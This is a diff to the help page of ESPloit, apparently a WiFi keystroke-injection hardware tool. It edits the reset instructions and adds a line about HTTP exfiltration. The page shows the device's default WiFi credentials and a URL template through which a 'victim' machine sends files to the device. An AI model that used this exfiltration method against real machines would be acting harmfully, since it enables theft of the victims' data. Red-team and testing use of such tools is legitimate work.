@@ -94,7 +94,7 @@ Select "38400 baud".<br>
 Now type in "ResetDefaultConfig:". Without the quotes but be sure to include the colon symbol.<br>
 Click Send.<br>
 You should now receive the following reply "Resetting configuration files back to default settings."<br>
-Wait about 15 seconds and unplug and replug in the device.<br>
+Wait about 15 seconds or until the LED blinks and unplug and replug in the device.<br>
 The device has now been reset back to default settings.<br>
 Connect to the Access Point with the SSID "Exploit" with a password of "DotAgency".<br>
 Open a web browser pointed to "http://192.168.1.1"<br>
@@ -281,6 +281,7 @@ Linux: nmcli dev wifi connect SSID-HERE password WIFI-PASSWORD-HERE<br>
 <br>
 For HTTP exfiltration method point the target machine to the url listed below:<br>
 http://ESPloit-IP-Here/exfiltrate?file=FILENAME.TXT&data=EXFILTRATED-DATA-HERE<br>
+The victim is forced to access the URL above and now under "List Exfiltrated Data" you will see the file "FILENAME.TXT" containing the exfiltrated data "EXFILTRATED-DATA-HERE".<br>
 <br>
 For FTP exfiltration method use the credentials configured in the "Configure ESPloit" page. Also note that only Passive Mode FTP is supported.<br>
 <br>
